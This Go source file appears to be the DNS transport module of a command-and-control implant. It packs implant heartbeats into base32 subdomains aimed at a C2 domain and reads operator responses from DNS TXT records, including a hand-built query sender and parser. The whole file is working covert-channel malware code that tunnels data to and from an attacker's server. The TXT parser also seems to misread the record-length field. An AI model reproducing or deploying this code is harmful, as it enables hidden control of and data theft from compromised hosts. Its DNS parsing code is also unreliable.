package transport

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
)

// DNSTransport implements Transport over DNS TXT queries.
// It encodes heartbeats as base32 subdomains and reads responses
// from TXT record answers.
type DNSTransport struct {
	dnsDomain  string
	resolver   string // optional custom DNS resolver
	queryCount int
}

// NewDNS creates a DNS transport.
// dnsDomain is the domain served by the C2 DNS server (e.g. "c2.example.com").
// resolver is an optional DNS server IP:port (empty = system default).
func NewDNS(dnsDomain, resolver string) *DNSTransport {
	return &DNSTransport{
		dnsDomain: strings.TrimRight(dnsDomain, "."),
		resolver:  resolver,
	}
}

func (d *DNSTransport) Name() string { return "dns" }
func (d *DNSTransport) Close() error { return nil }

func (d *DNSTransport) Beacon(hb *beacon.ImplantHeartbeat) (*beacon.BeaconResponse, error) {
	// Marshal heartbeat to JSON
	hbJSON, err := json.Marshal(hb)
	if err != nil {
		return nil, fmt.Errorf("dns marshal: %w", err)
	}

	// Encode as base32 (no padding, no '/')
	b32 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(hbJSON)
	// DNS labels max 63 chars, split into chunks
	chunks := chunkString(b32, 50)
	labels := strings.Join(chunks, ".")

	// Add query ID and random prefix to avoid caching
	queryID := rand.Intn(10000)
	qname := fmt.Sprintf("q%d.%s.%s", queryID, labels, d.dnsDomain)

	// Query TXT record
	var txtRecords []string
	if d.resolver != "" {
		txtRecords, err = d.queryCustomResolver(qname, d.resolver)
	} else {
		txtRecords, err = net.LookupTXT(qname)
	}
	if err != nil {
		return nil, fmt.Errorf("dns lookup: %w", err)
	}

	// Combine TXT records
	combined := strings.Join(txtRecords, "")
	if combined == "" {
		return nil, fmt.Errorf("dns empty response")
	}

	// Decode base32 response
	decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(combined)
	if err != nil {
		decoded, err = base32.StdEncoding.DecodeString(combined)
		if err != nil {
			return nil, fmt.Errorf("dns decode: %w", err)
		}
	}

	var br beacon.BeaconResponse
	if err := json.Unmarshal(decoded, &br); err != nil {
		return nil, fmt.Errorf("dns unmarshal: %w", err)
	}
	return &br, nil
}

// chunkString splits a string into chunks of max size n.
func chunkString(s string, n int) []string {
	var chunks []string
	for i := 0; i < len(s); i += n {
		end := i + n
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

// queryCustomResolver performs a TXT lookup using a specific DNS resolver.
func (d *DNSTransport) queryCustomResolver(qname, resolver string) ([]string, error) {
	conn, err := net.DialTimeout("udp", resolver, 5*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	id := rand.Intn(65535)
	query := buildTXTQuery(id, qname)

	conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write(query); err != nil {
		return nil, err
	}

	resp := make([]byte, 1500)
	n, err := conn.Read(resp)
	if err != nil {
		return nil, err
	}
	resp = resp[:n]

	return parseTXTResponse(id, resp), nil
}

// buildTXTQuery builds a minimal DNS query for a TXT record.
func buildTXTQuery(id int, qname string) []byte {
	buf := make([]byte, 0, 512)
	buf = append(buf, byte(id>>8), byte(id))
	buf = append(buf, 0x01, 0x00) // flags: recursion desired
	buf = append(buf, 0x00, 0x01) // questions: 1
	buf = append(buf, 0x00, 0x00) // answers: 0
	buf = append(buf, 0x00, 0x00) // authority: 0
	buf = append(buf, 0x00, 0x00) // additional: 0

	for _, part := range strings.Split(qname, ".") {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00) // end of QNAME

	buf = append(buf, 0x00, 0x10) // QTYPE: TXT = 16
	buf = append(buf, 0x00, 0x01) // QCLASS: IN = 1

	return buf
}

// parseTXTResponse extracts TXT record data from a DNS response.
func parseTXTResponse(id int, resp []byte) []string {
	if len(resp) < 12 {
		return nil
	}

	respID := int(resp[0])<<8 | int(resp[1])
	if respID != id {
		return nil
	}

	offset := 12
	for offset < len(resp) {
		if resp[offset] == 0 {
			offset++
			break
		}
		offset += int(resp[offset]) + 1
	}
	offset += 4

	var records []string
	for offset < len(resp)-4 {
		if offset+10 > len(resp) {
			break
		}
		if resp[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < len(resp) && resp[offset] != 0 {
				offset += int(resp[offset]) + 1
			}
			offset++
		}

		if offset+10 > len(resp) {
			break
		}
		rtype := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 4
		rdlen := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2

		if offset+rdlen > len(resp) {
			break
		}

		if rtype == 16 { // TXT
			pos := offset
			end := offset + rdlen
			var txtParts []string
			for pos < end {
				length := int(resp[pos])
				pos++
				if pos+length <= len(resp) {
					txtParts = append(txtParts, string(resp[pos:pos+length]))
					pos += length
				} else {
					break
				}
			}
			records = append(records, strings.Join(txtParts, ""))
		}
		offset += rdlen
	}

	return records
}
